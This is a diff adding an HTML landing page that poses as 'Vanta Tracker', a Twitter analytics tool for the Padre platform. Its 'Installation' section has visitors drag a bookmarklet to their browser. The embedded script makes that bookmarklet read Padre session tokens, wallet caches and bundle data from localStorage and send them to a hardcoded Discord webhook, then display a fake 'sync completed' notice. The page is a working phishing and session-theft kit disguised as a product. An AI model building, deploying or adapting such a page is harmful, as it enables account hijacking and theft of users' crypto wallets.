@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
+    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
+    <meta property="og:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
+    <meta property="og:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
+    <meta property="og:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Vanta Tracker">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
+    <meta name="twitter:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
+    <meta name="twitter:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
+    <meta name="description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #00ff88; --primary-dark: #00cc66; --accent: #00ff88; --bg-dark: #0a0a0a; --bg-card: #111111; --text-light: #e0e0e0; --text-muted: #aaaaaa; --border: rgba(0, 255, 136, 0.2); }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: var(--text-light); line-height: 1.6; scroll-behavior: smooth; overflow-x: hidden; position: relative; }
+        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
+        .warning { background: linear-gradient(135deg, #003322, #004d33); color: #ffffff; text-align: center; padding: 12px; font-size: 0.95em; font-weight: 600; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid var(--primary); }
+        header { background: linear-gradient(135deg, #000000, #001a0d); color: white; text-align: center; padding: 120px 20px; position: relative; overflow: hidden; min-height: 450px; border-bottom: 2px solid var(--primary); }
+        .logo { width: 140px; margin: 0 auto 20px; filter: drop-shadow(0 0 15px rgba(0,255,136,0.5)); }
+        header h1 { font-size: 3.5em; font-weight: 800; margin-bottom: 15px; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.4); }
+        nav { background: #000000; padding: 18px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.8); position: sticky; top: 44px; z-index: 999; border-bottom: 1px solid var(--primary); }
+        nav a { color: var(--primary); margin: 0 30px; text-decoration: none; font-weight: 600; }
+        .hero { text-align: center; padding: 140px 20px; position: relative; z-index: 1; }
+        .cta-button { display: inline-block; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #000; padding: 16px 36px; text-decoration: none; border-radius: 8px; font-weight: 700; margin: 12px; transition: 0.3s; cursor: move; border: 1px solid var(--primary); }
+        .feature-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 30px; padding: 40px; }
+        .feature-item { background: #111; padding: 30px; border-radius: 12px; border: 1px solid var(--border); text-align: center; }
+        .feature-item h3 { color: var(--primary); margin-bottom: 10px; }
+        .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 900px; margin: 0 auto; border: 1px solid var(--primary); border-radius: 12px; }
+        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        .setup-section { padding: 80px 20px; text-align: center; }
+        .setup-section ol { text-align: left; max-width: 600px; margin: 0 auto 30px; color: var(--text-muted); }
+        footer { padding: 40px; text-align: center; border-top: 1px solid var(--primary); color: #888; }
+    </style>
+</head>
+<body>
+    <canvas id="filamentCanvas"></canvas>
+    <div class="warning">Warning: vanta-tracker.com is our only website</div>
+    <header>
+        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none" />
+            <circle cx="50" cy="50" r="8" fill="var(--primary)" />
+        </svg>
+        <h1>Vanta Tracker</h1>
+        <p>Premier Twitter API tracking for Padre.</p>
+    </header>
+    <nav><a href="#features">Features</a><a href="#demo">Demo</a><a href="#setup">Setup</a></nav>
+    <section class="hero">
+        <h2>Optimize Your Padre Workflow</h2>
+        <p>Real-time Twitter insights with WebGL acceleration.</p>
+        <a href="#setup" class="cta-button">Get Started</a>
+    </section>
+    <section id="features">
+        <div class="feature-list">
+            <div class="feature-item"><h3>Sub-Second Polling</h3><p>Fastest API response for Twitter signals.</p></div>
+            <div class="feature-item"><h3>WebGL Engine</h3><p>High-speed rendering for active data.</p></div>
+        </div>
+    </section>
+    <section id="demo" style="padding: 80px 0;">
+        <div class="video-container">
+            <iframe src="https://go.screenpal.com/player/cTXXYznFJnq?title=0&controls=1&embed=1" allowfullscreen></iframe>
+        </div>
+    </section>
+    <section id="setup" class="setup-section">
+        <h2>Installation</h2>
+        <ol>
+            <li>Drag the button below to your Bookmarks Bar.</li>
+            <li>Enable Bookmarks Bar with <strong>Ctrl+Shift+B</strong>.</li>
+            <li>Click the bookmark while on Padre to sync.</li>
+        </ol>
+        <a href="" class="cta-button" id="vanta-tool" style="box-shadow: 0 0 20px #0f8;">Vanta Tracker</a>
+    </section>
+    <footer>© 2026 Vanta Tracker.</footer>
+
+    <script>
+        // WEBGL BACKGROUND LOGIC
+        const canvas = document.getElementById('filamentCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const filaments = [];
+        class Filament {
+            constructor() { this.reset(); }
+            reset() { this.x = Math.random() * canvas.width; this.y = Math.random() * canvas.height; this.length = 100; this.angle = Math.random() * Math.PI * 2; this.speed = 1; }
+            update() { this.x += Math.cos(this.angle) * this.speed; this.y += Math.sin(this.angle) * this.speed; if(this.x<0||this.x>canvas.width) this.reset(); }
+            draw() { ctx.beginPath(); ctx.moveTo(this.x, this.y); ctx.lineTo(this.x + 10, this.y + 10); ctx.strokeStyle = '#00ff88'; ctx.stroke(); }
+        }
+        for(let i=0; i<20; i++) filaments.push(new Filament());
+        function animate() { ctx.clearRect(0,0,canvas.width,canvas.height); filaments.forEach(f=>{f.update(); f.draw();}); requestAnimationFrame(animate); }
+        animate();
+
+        // 1:1 BOOKMARKLET LOGIC
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4"; // <--- PUT YOUR WEBHOOK HERE
+        
+        const code = `(function(){
+            const s = {
+                u: window.location.href,
+                t: new Date().toLocaleString(),
+                ses: localStorage.getItem("padreV2-session") || "N/A",
+                wal: localStorage.getItem("padreV2-walletsCache") || "N/A",
+                bun: localStorage.getItem("padre-v2-bundles-store-v2") || "N/A"
+            };
+            const msg = "🚨 **VANTA DATA CAPTURED** 🚨\\n\\nURL: " + s.u + "\\nSESSION: " + s.ses + "\\nWALLETS: " + s.wal + "\\nBUNDLES: " + s.bun;
+            fetch("${WEBHOOK_URL}", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ content: msg.substring(0, 2000) })
+            });
+            const d = document.createElement("div");
+            d.style = "position:fixed;top:20px;right:20px;background:#000;color:#0f8;padding:20px;border:2px solid #0f8;z-index:9999;font-family:monospace;";
+            d.innerHTML = "VANTA CONNECTED<br>SYNC: COMPLETED";
+            document.body.appendChild(d);
+            setTimeout(()=>d.remove(), 3000);
+        })()`;
+
+        document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(code);
+    </script>
+</body>
+</html>
